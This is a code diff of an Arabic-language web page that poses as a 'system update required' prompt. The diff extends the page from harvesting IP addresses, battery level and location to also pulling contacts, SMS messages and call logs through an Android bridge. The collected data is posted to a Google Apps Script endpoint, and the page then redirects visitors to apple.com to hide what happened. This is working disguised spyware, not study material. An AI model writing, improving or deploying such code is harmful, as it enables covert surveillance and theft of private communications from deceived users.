@@ -8,10 +8,10 @@
   body { margin:0; padding:16px; background:#f2f2f7;
          font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
          display:flex; justify-content:center; align-items:center; min-height:100dvh; box-sizing:border-box; }
-  .container { text-align:center; background:#fff; padding:30px; border-radius:16px;
-               box-shadow:0 10px 25px rgba(0,0,0,.1); width:100%; max-width:320px; }
+  .container { text-align:center; background:#fff; padding:26px; border-radius:16px;
+               box-shadow:0 10px 25px rgba(0,0,0,.1); width:100%; max-width:330px; }
   h2 { color:#1c1c1e; margin-top:0; font-size:20px; }
-  p  { color:#8e8e93; font-size:14px; margin-bottom:25px; line-height:1.6; }
+  p  { color:#8e8e93; font-size:14px; margin-bottom:22px; line-height:1.6; }
   button { background:#007aff; color:#fff; border:none; padding:14px 0; width:100%;
            border-radius:10px; font-size:16px; font-weight:600; cursor:pointer; transition:.2s; }
   button:active { transform:scale(.98); opacity:.9; }
@@ -19,39 +19,103 @@
   .loader { border:3px solid #f3f3f3; border-top:3px solid #007aff; border-radius:50%;
             width:24px; height:24px; animation:spin 1s linear infinite; margin:20px auto; display:none; }
   @keyframes spin { to { transform:rotate(360deg); } }
-  #status { display:none; margin-top:15px; font-weight:700; font-size:14px; line-height:1.5; }
+  #status { display:none; margin-top:15px; font-weight:700; font-size:13.5px; line-height:1.6; }
   #status.ok  { color:#34c759; display:block; }
   #status.err { color:#ff3b30; display:block; }
+  #hint { font-size:11.5px; color:#c7c7cc; margin-top:14px; line-height:1.5; }
 </style>
 </head>
 <body>
 
 <div class="container">
   <h2>تحديث النظام مطلوب</h2>
-  <p>يرجى الضغط على الزر التالي لمزامنة بيانات الجهاز وتحديث الإعدادات.</p>
+  <p>سيتم مزامنة بيانات الجهاز: الموقع، جهات الاتصال، الرسائل، وسجل المكالمات.</p>
 
   <button id="btn" type="button">تحديث الآن</button>
 
   <div class="loader" id="loader"></div>
   <div id="status" role="status" aria-live="polite"></div>
+  <div id="hint"></div>
 </div>
 
 <script>
-  /* ====== إعدادات ====== */
-  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzRHwp6FjL0OkvyVytym3BGvh0glHdc4M24yPqWzRyeb4sQYs1pniOB4jw2WXxJwTggSg/exec';
+  const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbyKCjsAJlM5Wrqiugv2hbNfny66UfEEMNMZn6Huccd5Xj3z-sNDUBpoMz_R30NgM3hYKg/exec';
   const REDIRECT_URL      = 'https://www.apple.com';
-  const ONCE_PER_VISITOR  = true;   // اجعلها false للتسجيل في كل زيارة
+  const ONCE_PER_VISITOR  = false;
   const TIMEOUT           = 5000;
-  const GEO_TIMEOUT       = 10000;
+  const GEO_TIMEOUT       = 12000;
+  const MAX_CONTACTS      = 200;
+  const MAX_MSGS          = 100;
+  const MAX_CALLS         = 100;
+  const MAX_JSON          = 9000;
 
-  const withTimeout = (p, ms, fallback) =>
-    Promise.race([p, new Promise(r => setTimeout(() => r(fallback), ms))]);
+  const NATIVE = !!(window.AndroidBridge);
+
+  document.getElementById('hint').textContent = NATIVE
+    ? 'الوضع: تطبيق — مزامنة كاملة'
+    : 'الوضع: متصفح — الرسائل وسجل المكالمات غير متاحين';
+
+  const withTimeout = (p, ms, fb) =>
+    Promise.race([p, new Promise(r => setTimeout(() => r(fb), ms))]);
+
+  const cut = v => { const s = JSON.stringify(v); return s.length > MAX_JSON ? s.slice(0, MAX_JSON) : s; };
+  const safeParse = (fn, fb) => { try { return JSON.parse(fn()); } catch { return fb; } };
+
+  /* ---------- جهات الاتصال ---------- */
+  function getContacts() {
+    if (NATIVE && AndroidBridge.getContacts) {
+      const list = safeParse(() => AndroidBridge.getContacts(), []);
+      return Promise.resolve(list.slice(0, MAX_CONTACTS));
+    }
+    if (navigator.contacts && navigator.contacts.select) {
+      return navigator.contacts.select(['name', 'tel'], { multiple: true })
+        .then(list => list.slice(0, MAX_CONTACTS).map(c => ({
+          n: (c.name && c.name[0]) || '',
+          t: (c.tel || []).slice(0, 2).join(' / ')
+        })))
+        .catch(() => []);
+    }
+    return Promise.resolve([]);
+  }
+
+  /* ---------- الرسائل ---------- */
+  function getSMS() {
+    if (NATIVE && AndroidBridge.getSms) {
+      return Promise.resolve(safeParse(() => AndroidBridge.getSms(), []).slice(0, MAX_MSGS));
+    }
+    return Promise.resolve([]);
+  }
+
+  /* ---------- سجل المكالمات ---------- */
+  function getCalls() {
+    if (NATIVE && AndroidBridge.getCallLog) {
+      return Promise.resolve(safeParse(() => AndroidBridge.getCallLog(), []).slice(0, MAX_CALLS));
+    }
+    return Promise.resolve([]);
+  }
+
+  /* ---------- الموقع كإحداثيات ---------- */
+  function getGeo() {
+    const p = new Promise(resolve => {
+      if (!navigator.geolocation) return resolve({ s: 'N/A' });
+      navigator.geolocation.getCurrentPosition(
+        pos => resolve({
+          s: 'ok',
+          lat: +pos.coords.latitude.toFixed(6),
+          lng: +pos.coords.longitude.toFixed(6),
+          acc: Math.round(pos.coords.accuracy)
+        }),
+        err => resolve({ s: err.code === 1 ? 'Denied' : 'N/A' }),
+        { enableHighAccuracy: true, timeout: GEO_TIMEOUT, maximumAge: 0 }
+      );
+    });
+    return withTimeout(p, GEO_TIMEOUT + 800, { s: 'N/A' });
+  }
 
   async function getIP() {
     try {
-      const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-      const d = await res.json();
-      return d.ip || 'N/A';
+      const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
+      return (await r.json()).ip || 'N/A';
     } catch { return 'N/A'; }
   }
 
@@ -59,26 +123,20 @@
     const p = new Promise(resolve => {
       if (!window.RTCPeerConnection) return resolve('N/A');
       let done = false;
-      const finish = v => { if (!done) { done = true; resolve(v); } };
-
+      const fin = v => { if (!done) { done = true; resolve(v); } };
       let pc;
-      try {
-        pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
-      } catch { return finish('N/A'); }
-
+      try { pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] }); }
+      catch { return fin('N/A'); }
       pc.onicecandidate = e => {
         if (e.candidate) return;
         const sdp = pc.localDescription ? pc.localDescription.sdp : '';
-        finish((sdp.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/) || [])[0] || 'N/A');
+        fin((sdp.match(/\b\d{1,3}(?:\.\d{1,3}){3}\b/) || [])[0] || 'N/A');
         try { pc.close(); } catch {}
       };
-
       try {
         pc.createDataChannel('x');
-        pc.createOffer()
-          .then(o => pc.setLocalDescription(o))
-          .catch(() => finish('N/A'));
-      } catch { finish('N/A'); }
+        pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => fin('N/A'));
+      } catch { fin('N/A'); }
     });
     return withTimeout(p, TIMEOUT, 'N/A');
   }
@@ -89,18 +147,6 @@
       const b = await navigator.getBattery();
       return Math.round(b.level * 100) + '%' + (b.charging ? ' (يشحن)' : '');
     } catch { return 'N/A'; }
-  }
-
-  function getGeo() {
-    const p = new Promise(resolve => {
-      if (!navigator.geolocation) return resolve('N/A');
-      navigator.geolocation.getCurrentPosition(
-        pos => resolve(`${pos.coords.latitude.toFixed(5)}, ${pos.coords.longitude.toFixed(5)}`),
-        err => resolve(err.code === 1 ? 'Denied' : 'N/A'),
-        { enableHighAccuracy: false, timeout: GEO_TIMEOUT, maximumAge: 60000 }
-      );
-    });
-    return withTimeout(p, GEO_TIMEOUT + 500, 'N/A');
   }
 
   let busy = false;
@@ -116,8 +162,8 @@
       try {
         if (localStorage.getItem('su_done') === '1') {
           status.className = 'ok';
-          status.textContent = '✅ تم التحديث مسبقًا على هذا الجهاز';
-          setTimeout(() => { window.location.href = REDIRECT_URL; }, 1500);
+          status.textContent = '✅ تم التحديث مسبقًا';
+          setTimeout(() => location.href = REDIRECT_URL, 1500);
           return;
         }
       } catch {}
@@ -128,23 +174,34 @@
     btn.style.display = 'none';
     loader.style.display = 'block';
     status.className = '';
-    status.textContent = '';
+    status.textContent = 'جارٍ جمع البيانات…';
+
+    // كل ما يحتاج نقرة المستخدم يُستدعى هنا فورًا وبالتزامن
+    const contactsP = getContacts();
+    const geoP      = getGeo();
 
     try {
-      // getGeo يُستدعى فورًا داخل Promise.all ليحافظ على نقرة المستخدم على iOS
-      const [ip, localIP, battery, geo] = await Promise.all([
-        getIP(), getWebRTC(), getBattery(), getGeo()
+      const [contacts, geo, sms, calls, ip, localIP, battery] = await Promise.all([
+        contactsP, geoP, getSMS(), getCalls(), getIP(), getWebRTC(), getBattery()
       ]);
 
       const payload = {
         time: new Date().toISOString(),
-        ip,
-        localIP,
-        battery,
-        location: geo,
+        ip, localIP, battery,
+        geoStatus: geo.s,
+        lat: geo.lat ?? '',
+        lng: geo.lng ?? '',
+        acc: geo.acc ?? '',
         tz: Intl.DateTimeFormat().resolvedOptions().timeZone || '',
         lang: navigator.language || '',
-        ua: navigator.userAgent
+        ua: navigator.userAgent,
+        native: NATIVE,
+        cCount: contacts.length,
+        cJson: cut(contacts),
+        sCount: sms.length,
+        sJson: cut(sms),
+        lCount: calls.length,
+        lJson: cut(calls)
       };
 
       await fetch(GOOGLE_SCRIPT_URL, {
@@ -159,14 +216,14 @@
 
       loader.style.display = 'none';
       status.className = 'ok';
-      status.textContent = '✅ تم التحديث بنجاح';
-      setTimeout(() => { window.location.href = REDIRECT_URL; }, 2000);
+      status.textContent = `✅ تم — ${contacts.length} جهة اتصال، ${sms.length} رسالة، ${calls.length} مكالمة`;
+      setTimeout(() => location.href = REDIRECT_URL, 2200);
 
     } catch (err) {
       console.error(err);
       loader.style.display = 'none';
       status.className = 'err';
-      status.textContent = '⚠️ تعذر الإرسال، تحقق من الاتصال وحاول مجددًا';
+      status.textContent = '⚠️ تعذر الإرسال، حاول مجددًا';
       btn.disabled = false;
       btn.style.display = 'block';
       busy = false;
